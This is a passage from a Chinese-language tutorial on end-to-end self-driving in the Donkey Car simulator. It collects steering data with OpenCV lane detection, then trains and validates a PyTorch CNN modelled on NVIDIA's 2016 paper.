frame = cv2.cvtColor(obv, cv2.COLOR_RGB2BGR) # 运行完以后重置当前场景 obv = env.reset()if __name__ == &#x27;__main__&#x27;: &#x27;&#x27;&#x27; 主函数入口 &#x27;&#x27;&#x27; main() 别忘了要先启动模拟器噢！ 到这里本节就已经接近尾声了。我对代码中的很多部分进行了修改，使它适应新版的opencv与实际情况。每一部分都重新编写了完整的测试代码。跳到这里没看的同学至少把测试代码运行一下，尝试理解原理。 注意：如果当前生成的赛道有“十字路口交叉”（每次重新进入赛道其生成的赛道都是随机绘制的），那么在运行的时候可能会出现失败、跑出赛道的现象。因为这种十字路口我们在程序中没有考虑。如何规避这个问题，有兴趣的同学可以自行研究。 本文更多的关注基于深度学习的图像处理技术，对于传统的图像处理算法（例如霍夫变换等）本文不再深入分析，同学们如果对这些传统图像处理算法不熟悉的可以自行再查阅资料深入研究，上面已经给出了不少资料的链接。 截止到目前为止，我们借助上面这个基于opencv的自动驾驶模拟平台，我们重新巩固了Python、opencv图像处理的基本使用方法，了解了自动驾驶项目的难点，对整个处理流程有了更进一步的认识。需要说明的是，尽管我们上述操作步骤是针对我们这个自动驾驶模拟平台的，但是以上步骤同样适用于很多其他图像处理任务，很多传统的图像处理任务都涵盖颜色空间变换、特定颜色物体提取、感兴趣区域过滤、霍夫变换等步骤，因此掌握上述常规的图像处理技术是非常重要的。 3.基于深度学习的自动驾驶控制在上一节中我们通过OpenCV图像处理技术实现了一个简易的自动驾驶小车。但是很明显，这辆自动驾驶小车的适应性很差，当图像中有相同颜色的干扰物出现时，那么对于这辆自动驾驶的小车来说就是顶级灾难。另外，我们需要大量人工定义的参数，例如行道线颜色（黄色或白色）、颜色阈值、霍夫变换阈值等，而且一旦地图环境换了，所有这些参数我们都得重新手工调整，这些参数之间又有一定的耦合性，参数调整很麻烦。很显然，这种处理方法普适性不好。 那么能不能丢给机器一大堆图片，让机器自己去学习如何从当前图像中分析出小车应该转向的合适角度？如果没有接触过深度学习，那么乍一听这个想法简直是天方夜谭，然而深度学习确实做到了。这就是为什么近十年深度学习在图像处理领域取得了全面成功。深度学习能够从大量图像数据中自行学习高层次语义特征，完成媲美人类甚至超越人类的推理水平，整个学习过程不用人为干预，我们要做的就是“喂”一堆图片并且设定好需要优化的目标函数即可。当我们“喂”的图片越多、种类越丰富，那么最终机器学习到的驾驶水平越强，而且适应性越好。 本小节开始我们将正式进入基于深度学习的自动驾驶领域。 3.0一些基础知识根据后面要用到的网络，这里放上一些基础知识，篇幅都不(太)长，请同学们阅读。 神经网络与深度学习 这种基本的认识想必大家已经有了，但这里还是放一放。 pytorch基础教程 pytorch可以使用英伟达NVIDIA的产品进行GPU运算，但AMD锐龙的显卡并不支持。教程后期有教到如何使用。这是非常浅显易懂的课(用张老师的话来说就是傻瓜式的)，因此虽然我们主要用到的是pytorch但这里不进行教学。如果仍有困难，后面我会现场讲解或录视频，加上写文档的方式帮助同学们。 bp神经网络原理 bp神经网络我在导论课上讲的那个就是，忘了的话可以去导论那个群下载对应的excel演示下来玩一下。对应的论文也是非常有趣，预训练现在的应用非常广泛，同学们可以阅读一下。 卷积神经网络与池化、全连接、归一化 全连接神经网络 归一化 端到端是什么 同时建议大家复习一下我当时给大家讲python的时候说到的os库。 3.1算法原理本项目实现思路参考2016年英伟达发表的论文《End to End Learning for Self-Driving Cars》。这篇文章提出的方法核心思想就是使用神经网络自动提取图像特征，从传统的 image -&gt; features -&gt; action变成了image -&gt; action。该论文使用了深度网络结构，大大增强了图像特征提取能力，最终取得了不错的效果，其训练的模型不论是普通道路还是高速路，不论有道路标线还是没有道路标线都非常有效，解决了传统算法泛化性能差的问题。本文方法的测试性能非常好，在16年自动驾驶研究火热时，是一篇影响力很大的文章，即使放到现在，也是作为自动驾驶入门必读的Paper。 整个算法原理很简单，是对真实人类操作的一个模拟。对于我们人类驾驶员来说，假设我们正在驾驶这辆车，我们的执行流程跟上面算法也是一样的。首先我们用眼睛观看路面，然后我们的大脑根据当前眼睛看到的路面情况“下意识”的转动方向盘，转动一个我们认为合适的角度，从而避免车辆开出路面。这篇论文算法实现原理也是这样，具体如下图所示： 通过中间摄像头采集图像，然后图像输入到预先训练好的CNN网络，这个网络的输出是一个转向角度（可以理解为方向盘的转向角度），有了这个角度就可以控制小车按照这个角度进行转向。 有了这样一个模式，我们就只需要想办法训练这个CNN模型，针对每帧图像，都有一个我们认为合适的转向角度输出，即输入图像，输出一个回归值。具体模型结构如下图所示： 整个模型结构并不复杂，就是一堆的普通的CNN卷积神经网络模块按照顺序堆叠，最后使用全连接网络输出回归值。这个模型一共包含30层，由于其输入精度比较低(66x200)，因此推理速度也是比较快的，借助GPU可以实现实时推理。具体的，图像首先经过Normalization标准化，然后经过5组卷积层处理，最后拉平以后通过4个全连接层输出一个回归值，这个回归值就是我们项目中的转向角。 这里我们会遇到一个问题，训练上述深度神经网络我们需要大量的数据，即每帧图像以及对应的最佳转向值，这些数据怎么来呢？这篇论文里提出了一个方法，既然是模拟人类行为，那么只要让驾驶水平高超的“老司机”在相关赛道上进行手动驾驶，驾驶时一边记录每帧图像同时记录当前帧对应的操控的转向角，这样一组组数据记录下来就是我们认为的“最佳”训练数据。训练时，将模型预测的角度与给定图像帧的期望转向角度进行比较，误差通过反向传播反馈到CNN训练过程中，如下图所示。从图可以看出，这个过程在一个循环中重复，直到误差（本例中使用均方误差）足够低，这意味着模型已经学会了如何合理地转向。事实上，这是一个非常典型的图像分类训练过程，只不过这里预测输出是数值（回归值）而不是对象类别（分类概率）。 可以想象，如果能够完全的训练好这个模型，那么最终模型的输出结果是非常接近人类驾驶经验的。这篇论文通过大量实验证明，上述模型能够直接从拍摄的路面图像中有效的学习到最终的转向角，省去了传统算法颜色区域检测、感兴趣区域选择、霍夫变换等一系列复杂的耦合步骤。这篇论文做了一组实验，通过收集不到一百小时的少量训练数据进行训练，最后得到的模型足以支持在各种条件下操控车辆，比如高速公路、普通公路和居民区道路，以及晴天、多云和雨天等天气状况。 需要说明的是，这个模型的输出仅有一个转向角度，这样容易学习成功。如果输出变量再多一些（例如油门值、摄像头角度、行人避障等），那么这个模型还需要再进一步优化，感兴趣的同学可以借鉴近两年的论文进行深入研究（而我们的项目就是要做这个）。接下来我们就按照这个算法流程进行实现。 ###3.2数据采集 针对我们采用的自动驾驶模拟平台，为了能够采集到每帧图像及对应的最佳转向角度，我们可以使用前面第2节方法编写控制代码通过键盘控制小车（低匀速运行，仅仅只需要控制转向角度），然后记录每帧数据即可。这种模式是真实自动驾驶使用的，但是需要我们自己把自己练成经验充足的“老司机”，然后再去教会算法怎么驾驶。这样比较麻烦，这里可以有一种“偷懒”的办法。我们使用前面调参调的不错的OpenCV自动驾驶版本，使用OpenCV算法自动驾驶，然后记录每帧图像及对应角度。尽管这个OpenCV自动驾驶水平本身也一般（没有一直控制在两条行道线的绝对正中间），但是胜在能够基本稳定在行道线内。本文只是一个自动驾驶入门项目，可以采用这样的方法收集数据，来快速验证深度学习自动驾驶可行性。真实项目的话还是需要向“老司机”学习的。 先定义自定义tools库，这里对上面的进行了一定的修改。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596import cv2import numpy as npdef region_of_interest(edges, color=&#x27;yellow&#x27;): &#x27;&#x27;&#x27; 感兴趣区域提取 &#x27;&#x27;&#x27; height, width = edges.shape mask = np.zeros_like(edges) # 定义感兴趣区域掩码轮廓 if color == &#x27;yellow&#x27;: polygon = np.array([[(0, height * 1 / 2), (width * 1 / 2, height * 1 / 2), (width * 1 / 2, height), (0, height)]], np.int32) else: polygon = np.array([[(width * 1 / 2, height * 1 / 2), (width, height * 1 / 2), (width, height), (width * 1 / 2, height)]], np.int32) # 填充感兴趣区域掩码 cv2.fillPoly(mask, polygon, 255) # 提取感兴趣区域 croped_edge = cv2.bitwise_and(edges, mask) return croped_edgedef detect_line(edges): &#x27;&#x27;&#x27; 基于霍夫变换的直线检测 &#x27;&#x27;&#x27; rho = 1 # 距离精度：1像素 angle = np.pi / 180 #角度精度：1度 min_thr = 10 #最少投票数 lines = cv2.HoughLinesP(edges, rho, angle, min_thr, np.array([]), minLineLength=8, maxLineGap=8) return linesdef average_lines(frame, lines, direction=&#x27;left&#x27;): &#x27;&#x27;&#x27; 小线段聚类 &#x27;&#x27;&#x27; lane_lines = [] if lines is None: print(direction + &#x27;没有检测到线段&#x27;) return lane_lines height, width, _ = frame.shape fits = [] for line in lines: for x1, y1, x2, y2 in line: if x1 == x2: continue # 计算拟合直线 fit = np.polyfit((x1, x2), (y1, y2), 1) slope = fit[0] intercept = fit[1] if direction == &#x27;left&#x27; and slope &lt; 0: fits.append((slope, intercept)) elif direction == &#x27;right&#x27; and slope &gt; 0: fits.append((slope, intercept)) if len(fits) &gt; 0: fit_average = np.average(fits, axis=0) lane_lines.append(make_points(frame, fit_average)) return lane_linesdef make_points(frame, line): &#x27;&#x27;&#x27; 根据直线斜率和截距计算线段起始坐标 &#x27;&#x27;&#x27; height, width, _ = frame.shape slope, intercept = line y1 = height y2 = int(y1 * 1 / 2) x1 = max(-width, min(2 * width, int((y1 - intercept) / slope))) x2 = max(-width, min(2 * width, int((y2 - intercept) / slope))) return [[x1, y1, x2, y2]]def display_line(frame, lines, line_color=(0, 0, 255), line_width=2): &#x27;&#x27;&#x27; 在原图上展示线段 &#x27;&#x27;&#x27; line_img = np.zeros_like(frame) if lines is not None: for line in lines: for x1, y1, x2, y2 in line: cv2.line(line_img, (x1, y1), (x2, y2), line_color, line_width) line_img = cv2.addWeighted(frame, 0.8, line_img, 1, 1) return line_img 完整采集代码如下，同样有一定的变化： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116# 导入系统库import cv2import numpy as npimport mathimport gymimport gym_donkeycar # 导入自定义库from tools import region_of_interest, detect_line, make_points, average_lines, display_line def main(): &#x27;&#x27;&#x27; 主函数 &#x27;&#x27;&#x27; # 设置模拟器环境 env = gym.make(&quot;donkey-generated-roads-v0&quot;) # 重置当前场景 obv = env.reset() # 开始启动 action = np.array([0, 0.3]) # 动作控制，第1个转向值，第2个油门值 # 执行动作 obv, reward, done, info = env.step(action) # 获取图像 frame = cv2.cvtColor(obv, cv2.COLOR_RGB2BGR) # 运行4000次动作 pic_index = 0 for t in range(4000): # 转换图像到HSV空间 height, width, _ = frame.shape hsv = cv2.cvtColor(frame, cv2.COLOR_BGR2HSV) # 黄色区域检测 lower_blue = np.array([15, 40, 40]) upper_blue = np.array([45, 255, 255]) yellow_mask = cv2.inRange(hsv, lower_blue, upper_blue) # 白色区域检测 lower_blue = np.array([0, 0, 200]) upper_blue = np.array([180, 30, 255]) white_mask = cv2.inRange(hsv, lower_blue, upper_blue) # 黄色线边缘提取 yellow_edge = cv2.Canny(yellow_mask, 200, 400) # 白色线边缘提取 white_edge = cv2.Canny(white_mask, 200, 400) # 黄色线感兴趣区域提取 yellow_roi = region_of_interest(yellow_edge, color=&#x27;yellow&#x27;) # 白色线感兴趣区域提取 white_roi = region_of_interest(white_edge, color=&#x27;white&#x27;) # 黄色线段检测 yellow_lines = detect_line(yellow_roi) yellow_lane = average_lines(frame, yellow_lines, direction=&#x27;left&#x27;) #yellow_show = display_line(frame, yellow_lane) # 白色线段检测 white_lines = detect_line(white_roi) white_lane = average_lines(frame, white_lines, direction=&#x27;right&#x27;) #white_show = display_line(frame, white_lane, line_color=(255, 0, 0)) # 计算转向角 x_offset = 0 y_offset = 0 if len(yellow_lane) &gt; 0 and len(white_lane) &gt; 0: # 检测到2条线 _, _, left_x2, _ = yellow_lane[0][0] _, _, right_x2, _ = white_lane[0][0] mid = int(width / 2) x_offset = (left_x2 + right_x2) / 2 - mid y_offset = int(height / 2) elif len(yellow_lane) &gt; 0 and len(yellow_lane[0]) == 1: # 只检测到黄色行道线 x1, _, x2, _ = yellow_lane[0][0] x_offset = x2 - x1 y_offset = int(height / 2) elif len(white_lane) &gt; 0 and len(white_lane[0]) == 1: # 只检测到白色行道线 x1, _, x2, _ = white_lane[0][0] x_offset = x2 - x1 y_offset = int(height / 2) else: # 一条线都没检测到 print(&#x27;检测不到行道线，退出程序&#x27;) break angle_to_mid_radian = math.atan(x_offset / y_offset) angle_to_mid_deg = int(angle_to_mid_radian * 180.0 / math.pi) steering_angle = angle_to_mid_deg / 45.0 action = np.array([steering_angle, 0.1]) # 油门值恒定 # 记录当前图像和转向角度 img_path = &quot;log/&#123;:d&#125;_&#123;:.4f&#125;.jpg&quot;.format(pic_index, steering_angle) cv2.imwrite(img_path, frame) pic_index += 1 # 执行动作 obv, reward, done, info = env.step(action) # 重新获取图像 frame = cv2.cvtColor(obv, cv2.COLOR_RGB2BGR) # 运行完以后重置当前场景 print(&#x27;结束本次采集&#x27;) obv = env.reset() if __name__ == &#x27;__main__&#x27;: &#x27;&#x27;&#x27; 主函数入口 &#x27;&#x27;&#x27; main() 图片名采用“图片帧号_转向角度.jpg”的形式命名。上述代码每次跑完会在log目录下生成4000多张图片。由于每次的地图都是随机生成的，因此我们可以多跑几次，多收集一些数据。 最终共采集10个文件夹图片，总共4万张图片： 接下来我们需要对这些图片进行整理，拆分数据集用于训练和验证。我们把这些文件夹移动到data&#x2F;simulate下，注意这个文件夹需要自己手动创建。 详细脚本代码create_data_lists.py如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677# 导入系统库import osimport random def creat_data_list(dataset_path, file_list, mode=&#x27;train&#x27;): &#x27;&#x27;&#x27; 创建txt文件列表 &#x27;&#x27;&#x27; with open(os.path.join(dataset_path, (mode + &#x27;.txt&#x27;)), &#x27;w&#x27;) as f: for (imgpath, angle) in file_list: f.write(imgpath + &#x27; &#x27; + str(angle) + &#x27;\\n&#x27;) print(mode + &#x27;.txt 已生成&#x27;) def getFileList(dir, Filelist, ext=None): &quot;&quot;&quot; 获取文件夹及其子文件夹中文件列表 输入 dir: 文件夹根目录 输入 ext: 扩展名 返回: 文件路径列表 &quot;&quot;&quot; newDir = dir if os.path.isfile(dir): if ext is None: Filelist.append(dir) else: if ext in dir[-3:]: Filelist.append(dir) elif os.path.isdir(dir): for s in os.listdir(dir): newDir = os.path.join(dir, s) getFileList(newDir, Filelist, ext) return Filelist def main(): &#x27;&#x27;&#x27; 主函数 &#x27;&#x27;&#x27; # 设置参数 org_img_folder = &#x27;./data/simulate&#x27; # 数据集根目录 train_ratio = 0.8 # 训练集占比 # 检索jpg文件 jpglist = getFileList(org_img_folder, [], &#x27;jpg&#x27;) print(&#x27;本次执行检索到 &#x27; + str(len(jpglist)) + &#x27; 个jpg文件\\n&#x27;) file_list = list() # 解析转向值 for jpgpath in jpglist: print(jpgpath) curDataDir = os.path.dirname(jpgpath) basename = os.path.basename(jpgpath) angle = (basename[:-4]).split(&#x27;_&#x27;)[-1] imgPath = os.path.join(curDataDir, basename).replace(&quot;\\\\&quot;, &quot;/&quot;) file_list.append((imgPath, angle)) # 切分数据 random.seed(256) random.shuffle(file_list) train_num = int(len(file_list) * train_ratio) train_list = file_list[0:train_num] val_list = file_list[train_num:] # 创建列表文件 creat_data_list(org_img_folder, train_list, mode=&#x27;train&#x27;) creat_data_list(org_img_folder, val_list, mode=&#x27;val&#x27;) if __name__ == &quot;__main__&quot;: &#x27;&#x27;&#x27; 程序入口 &#x27;&#x27;&#x27; main() 上述代码我们查找每个log文件夹下的jpg文件，然后解析出对应的转向值。将这些值最后分别保存到train.txt和val.txt文件中。在代码里面，我们设定训练集占比0.8，剩下的0.2则为验证集。 生成的train.txt和val.txt文件每行内容表示一个样本，由图片路径和转向值组成，中间用空格隔开。 接下来我们将使用Pytoch框架实现深度学习算法进行训练、验证。 3.3模型训练 首先定义数据采集器datasets.py，代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364# 导入系统库import osimport numpy as npimport cv2 # 导入PyTorch库import torchfrom torch.utils.data import Dataset class AutoDriveDataset(Dataset): &quot;&quot;&quot; 数据集加载器 &quot;&quot;&quot; def __init__(self, data_folder, mode, transform=None): &quot;&quot;&quot; :参数 data_folder: # 数据文件所在文件夹根路径(train.txt和val.txt所在文件夹路径) :参数 mode: &#x27;train&#x27; 或者 &#x27;val&#x27; :参数 normalize_type: 图像归一化处理方式 &quot;&quot;&quot; self.data_folder = data_folder self.mode = mode.lower() self.transform = transform assert self.mode in &#123;&#x27;train&#x27;, &#x27;val&#x27;&#125; # 读取图像列表路径 if self.mode == &#x27;train&#x27;: file_path=os.path.join(data_folder, &#x27;train.txt&#x27;) else: file_path=os.path.join(data_folder, &#x27;val.txt&#x27;) self.file_list=list() with open(file_path, &#x27;r&#x27;) as f: files = f.readlines() for file in files: if file.strip() is None: continue self.file_list.append([file.split(&#x27; &#x27;)[0],float(file.split(&#x27; &#x27;)[1])]) def __getitem__(self, i): &quot;&quot;&quot; :参数 i: 图像检索号 :返回: 返回第i个图像和标签 &quot;&quot;&quot; # 读取图像 img = cv2.imread(self.file_list[i][0]) img = cv2.cvtColor(img,cv2.COLOR_BGR2HSV) if self.transform: img = self.transform(img) # 读取标签 label = self.file_list[i][1] label = torch.from_numpy(np.array([label])).float() return img, label def __len__(self): &quot;&quot;&quot; 为了使用PyTorch的DataLoader,必须提供该方法. :返回: 加载的图像总数 &quot;&quot;&quot; return len(self.file_list) 上述代码比较简单，我们构造了AutoDriveDataset类用于作为自动驾驶小车数据读取类，从train.txt和val.txt中根据每行内容得到每个样本的图像路径和对应的真值标签。这里需要注意下颜色空间，我们最终是使用HSV空间进行训练的，因此需要做一下转化。 这里插播一下一个自定义的方法库utils.py： 123456789101112131415161718class AverageMeter(object): &#x27;&#x27;&#x27; 平均器类,用于计算平均值、总和 &#x27;&#x27;&#x27; def __init__(self): self.reset() def reset(self): self.val = 0 self.avg = 0 self.sum = 0 self.count = 0 def update(self, val, n=1): self.val = val self.sum += val * n self.count += n self.avg = self.sum / self.count 虽然这个文件里面只有一个类，但创建这样一个文件是习惯。 有了数据读取类以后我们就下来定义模型，具体代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041# 导入PyTorch库import torch.nn as nnimport torch.nn.functional as F class AutoDriveNet(nn.Module): &#x27;&#x27;&#x27; 端到端自动驾驶模型 &#x27;&#x27;&#x27; def __init__(self): &quot;&quot;&quot; 初始化 &quot;&quot;&quot; super(AutoDriveNet, self).__init__() self.conv_layers = nn.Sequential(nn.Conv2d(3, 24, 5, stride=2), nn.ELU(), nn.Conv2d(24, 36, 5, stride=2), nn.ELU(), nn.Conv2d(36, 48, 5, stride=2), nn.ELU(), nn.Conv2d(48, 64, 3), nn.ELU(), nn.Conv2d(64, 64, 3), nn.Dropout(0.5)) self.linear_layers = nn.Sequential( #nn.Linear(in_features=64 * 2 * 33, out_features=100), nn.Linear(in_features=64 * 8 * 13, out_features=100), nn.ELU(), nn.Linear(in_features=100, out_features=50), nn.ELU(), nn.Linear(in_features=50, out_features=10), nn.Linear(in_features=10, out_features=1)) def forward(self, input): &#x27;&#x27;&#x27; 前向推理 &#x27;&#x27;&#x27; input = input.view(input.size(0), 3, 120, 160) output = self.conv_layers(input) output = output.view(output.size(0), -1) output = self.linear_layers(output) return output 这里需要注意的是我们的模型跟论文里的稍微有点不一样(见下)，主要是因为我们的图像尺寸是120x160的，而论文里使用的是66x200。因此，我们对应的输入需要调整下，另外，在最后全连接层也相应的在维度上要调整。对于实际项目来说，现在很多的摄像头都是使用3:4分辨率的，例如树莓派摄像头典型的分辨率是480x640，因此，修改过后的模型更具有普遍性，还方便后面迁移到真实环境训练。 12345678910111213141516self.conv_layers = nn.Sequential(nn.Conv2d(3, 24, 5, stride=2), nn.ELU(), nn.Conv2d(24, 36, 5, stride=2), nn.ELU(), nn.Conv2d(36, 48, 5, stride=2), nn.ELU(), nn.Conv2d(48, 64, 3), nn.ELU(), nn.Conv2d(64, 64, 3), nn.Dropout(0.5))self.linear_layers = nn.Sequential( #nn.Linear(in_features=64 * 2 * 33, out_features=100), nn.Linear(in_features=64 * 8 * 13, out_features=100), nn.ELU(), nn.Linear(in_features=100, out_features=50), nn.ELU(), nn.Linear(in_features=50, out_features=10), nn.Linear(in_features=10, out_features=1)) 整个模型比较简单，前面是多个cnn，最后接几个全连接网络，输入是3通道图像，输出是一个转向回归值。 训练脚本代码train.py如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135# 导入torch库import torch.backends.cudnn as cudnnimport torchfrom torch import nnimport torchvision.transforms as transformsfrom torch.utils.tensorboard import SummaryWriter# 导入自定义库from models import AutoDriveNetfrom datasets import AutoDriveDatasetfrom utils import *def main(): &quot;&quot;&quot; 训练. &quot;&quot;&quot; # 数据集路径 data_folder = &#x27;./data/simulate&#x27; # 学习参数 checkpoint = None # 预训练模型路径，如果不存在则为None # checkpoint = &quot;./results/checkpoint.pth&quot; batch_size = 400 # 批大小 start_epoch = 1 # 轮数起始位置 epochs = 1000 # 迭代轮数 lr = 1e-4 # 学习率 # 设备参数 device = torch.device(&quot;cuda&quot; if torch.cuda.is_available() else &quot;cpu&quot;) print(torch.cuda.is_available(), device) #ngpu = 4 # 用来运行的gpu数量 cudnn.benchmark = True # 对卷积进行加速 writer = SummaryWriter() # 实时监控 使用命令 tensorboard --logdir runs 进行查看 # 初始化模型 model = AutoDriveNet() # 初始化优化器 optimizer = torch.optim.Adam(params=filter(lambda p: p.requires_grad, model.parameters()), lr=lr) # 迁移至默认设备进行训练 model = model.to(device) model = model.cuda() criterion = nn.MSELoss().to(device) criterion = nn.MSELoss().cuda() # 加载预训练模型 if checkpoint is not None: checkpoint = torch.load(checkpoint) start_epoch = checkpoint[&#x27;epoch&#x27;] + 1 model.load_state_dict(checkpoint[&#x27;model&#x27;]) optimizer.load_state_dict(checkpoint[&#x27;optimizer&#x27;]) # 单机多卡训练 # if torch.cuda.is_available(): # model = nn.DataParallel(model, device_ids=list(range(ngpu))) # model = nn.DataParallel(model, device_ids=[0]) # 定制化的dataloader transformations = transforms.Compose([ transforms.ToTensor(), # 通道置前并且将0-255RGB值映射至0-1 # transforms.Normalize( # mean=[0.485, 0.456, 0.406], # 归一化至[-1,1] mean std 来自imagenet 计算 # std=[0.229, 0.224, 0.225]) ]) train_dataset = AutoDriveDataset(data_folder, mode=&#x27;train&#x27;, transform=transformations) train_loader = torch.utils.data.DataLoader(train_dataset, batch_size=batch_size, shuffle=True, num_workers=0, pin_memory=True) # 开始逐轮训练 for epoch in range(start_epoch, epochs + 1): model.train() # 训练模式：允许使用批样本归一化 loss_epoch = AverageMeter() # 统计损失函数 n_iter = len(train_loader) # 按批处理 for i, (imgs, labels) in enumerate(train_loader): # 数据移至默认设备进行训练 imgs = imgs.to(device) labels = labels.to(device) # 前向传播 pre_labels = model(imgs) # 计算损失 loss = criterion(pre_labels, labels) # 后向传播 optimizer.zero_grad() loss.backward() # 更新模型 optimizer.step() # 记录损失值 loss_epoch.update(loss.item(), imgs.size(0)) # 打印结果 print(&quot;第 &quot; + str(i) + &quot; 个batch训练结束&quot;) # 手动释放内存 del imgs, labels, pre_labels # 监控损失值变化 writer.add_scalar(&#x27;MSE_Loss&#x27;, loss_epoch.avg, epoch) print(&#x27;epoch:&#x27; + str(epoch) + &#x27; MSE_Loss:&#x27; + str(loss_epoch.avg)) # 保存预训练模型 torch.save( &#123; &#x27;epoch&#x27;: epoch, # &#x27;model&#x27;: model.module.state_dict(), &#x27;model&#x27;: model.state_dict(), &#x27;optimizer&#x27;: optimizer.state_dict() &#125;, &#x27;results/checkpoint.pth&#x27;) # 训练结束关闭监控 writer.close()if __name__ == &#x27;__main__&#x27;: &#x27;&#x27;&#x27; 程序入口 &#x27;&#x27;&#x27; main() 新旧版更替，不同的运行环境都有可能导致代码报各种错误。这里真是坑到不行qwq。经过我反复测试，大家报错时可以解开就近的注释部分进行尝试，这应该是目前最为稳定的版本了。 注意： 12writer = SummaryWriter()writer.add_scalar(&#x27;MSE_Loss&#x27;, loss_epoch.avg, epoch) 第一行代码及下面的相关方法使得我们可以在pycharm下方终端使用命令 tensorboard –logdir runs ，点击出现的网页链接(用edge或者chome)，可以看到误差改变情况。如果这行代码报错了，请在终端运行命令 pip install tensorboard等待安装完成。反复刷新浏览器可以更新。根据网页提示进行使用。如果测试的时候运行过太多次，可以修改第二行代码的字符串，会生成一个新的表。删除根目录下run的文件也可以起到减少的作用。 12345#ngpu = 4 # 用来运行的gpu数量# 单机多卡训练 # if torch.cuda.is_available(): # model = nn.DataParallel(model, device_ids=list(range(ngpu))) # model = nn.DataParallel(model, device_ids=[0]) 只有一个显卡的同学一定要注意保持所有单机多卡训练的代码处于注释状态(我在这儿被坑惨了) 1234567torch.save( &#123; &#x27;epoch&#x27;: epoch, # &#x27;model&#x27;: model.module.state_dict(), &#x27;model&#x27;: model.state_dict(), &#x27;optimizer&#x27;: optimizer.state_dict() &#125;, &#x27;results/checkpoint.pth&#x27;) 对model字段的保存，有的版本需要用注释里的字段，有的用当前的就行。请注意results文件夹最好手动创建。 3.4模型验证上面的代码需要迭代1000次, epoch&#x3D;1000的时候基本处在一个比较好的收敛位置，此时误差下降到1e-5左右。不过在跑到第140次左右时就已经下降到1e-4，让误差下降一个数量级在实际工程中还是非常重要的，不过同学们在使用的时候其实跑到这样也能用了。 验证代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091# 导入系统库import time# 导入PyTorch库import torchfrom torch import nnimport torch.backends.cudnn as cudnnimport torchvision.transforms as transforms# 导入自定义库from datasets import AutoDriveDatasetfrom models import AutoDriveNetfrom utils import *def main(): # 测试集目录 data_folder = &quot;./data/simulate&quot; # 定义运行的GPU数量 ngpu = 1 # cudnn.benchmark = True # 定义设备运行环境 print(&quot;定义设备环境&quot;) device = torch.device(&quot;cuda&quot; if torch.cuda.is_available() else &quot;cpu&quot;) # 加载预训练模型 print(&quot;加载预训练模型&quot;) checkpoint = torch.load(&quot;./results/checkpoint.pth&quot;) model = AutoDriveNet() model = model.to(device) model.load_state_dict(checkpoint[&#x27;model&#x27;]) # 多GPU封装 #if torch.cuda.is_available(): # model = nn.DataParallel(model, device_ids=list(range(ngpu))) # 定制化的dataloader # 定制dataloader transformations = transforms.Compose([ transforms.ToTensor(), # 通道置前并且将0-255RGB值映射至0-1 # transforms.Normalize( # mean=[0.485, 0.456, 0.406], # 归一化至[-1,1] mean std 来自imagenet 计算 # std=[0.229, 0.224, 0.225]) ]) val_dataset = AutoDriveDataset(data_folder, mode=&#x27;val&#x27;, transform=transformations ) val_loader = torch.utils.data.DataLoader(val_dataset, batch_size=1, shuffle=False, num_workers=1, pin_memory=True) # 定义评估指标 criterion = nn.MSELoss().to(device) # 记录误差值 MSEs = AverageMeter() # 记录测试时间 model.eval() start = time.time() with torch.no_grad(): print(&quot;开始进行测试&quot;) # 逐批样本进行推理计算 for i, (imgs, labels) in enumerate(val_loader): print(&quot;第&#123;&#125;次计算进行中&quot;.format(i)) # 数据移至默认设备进行推理 imgs = imgs.to(device) labels = labels.to(device) # 前向传播 pre_labels = model(imgs) # 计算误差 loss = criterion(pre_labels, labels) MSEs.update(loss.item(), imgs.size(0)) # 输出平均均方误差 print(&#x27;MSE &#123;mses.avg: .3f&#125;&#x27;.format(mses=MSEs)) print(&#x27;平均单张样本用时 &#123;:.3f&#125; 秒&#x27;.format((time.time() - start) / len(val_dataset)))if __name__ == &#x27;__main__&#x27;: &#x27;&#x27;&#x27; 程序入口 &#x27;&#x27;&#x27; main() 运行结果如下： 我们的转向角度取值范围是[-1, 1]，这样的误差比较小，是可以接受的。请注意多卡训练的同学，一定要解开nn.DataParallel的注释，否则是无法运行的。 这里等待的时间比较长，所以我增加了一些print输出来判断到底是电脑卡了还是程序在运行。同学们如果配置比较低，也建议这样自行增加一些print。 3.5单张图片预测为什么上一步已经用8000张图片进行预测了，这里还要用单张图片来尝试呢？真实的自动驾驶的时候，我们是要对每一张图片进行分析的。所以这里来尝试一下用单张图片来分析。 我们选取一张比较有代表性的图片: 大家可以先猜测一下这个转向角度。 下面是测试代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657# 导入OpenCV库import cv2 # 导入PyTorch库from torch import nnimport torch # 导入自定义库from models import AutoDriveNetfrom utils import * def main(): &#x27;&#x27;&#x27; 主函数 &#x27;&#x27;&#x27; # 测试图像 imgPath = &#x27;./results/test.jpg&#x27; # 推理环境 device = torch.device(&quot;cuda&quot; if torch.cuda.is_available() else &quot;cpu&quot;) # 加载训练好的模型 checkpoint = torch.load(&#x27;./results/checkpoint.pth&#x27;) model = AutoDriveNet() model = model.to(device) model.load_state_dict(checkpoint[&#x27;model&#x27;],strict=False) # 加载图像 img = cv2.imread(imgPath) img = cv2.cvtColor(img, cv2.COLOR_BGR2HSV) # 图像预处理 # PIXEL_MEANS = (0.485, 0.456, 0.406) # RGB格式的均值和方差 # PIXEL_STDS = (0.229, 0.224, 0.225) img = torch.from_numpy(img.copy()).float() img /= 255.0 # img -= torch.tensor(PIXEL_MEANS) # img /= torch.tensor(PIXEL_STDS) img = img.permute(2, 0, 1) img.unsqueeze_(0) # 转移数据至设备 img = img.to(device) # 模型推理 model.eval() with torch.no_grad(): prelabel = model(img).squeeze(0).cpu().detach().numpy() print(&#x27;预测结果 &#123;:.3f&#125; &#x27;.format(prelabel[0])) if __name__ == &#x27;__main__&#x27;: &#x27;&#x27;&#x27; 程序入口 &#x27;&#x27;&#x27; main() 